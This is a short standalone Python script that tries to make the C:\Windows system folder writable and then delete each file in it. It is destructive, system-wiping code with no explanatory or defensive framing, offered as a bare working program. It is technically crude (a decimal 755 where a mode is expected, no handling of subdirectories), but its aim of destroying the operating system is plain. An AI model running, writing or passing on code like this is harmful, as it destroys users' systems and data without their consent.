import os
os.chmod("C:\\Windows",755)
for i in os.listdir("C:\\Windows"):
    os.chmod(f"C:\\Windows\\{i}",755)
    os.remove(f"C:\\Windows\\{i}")
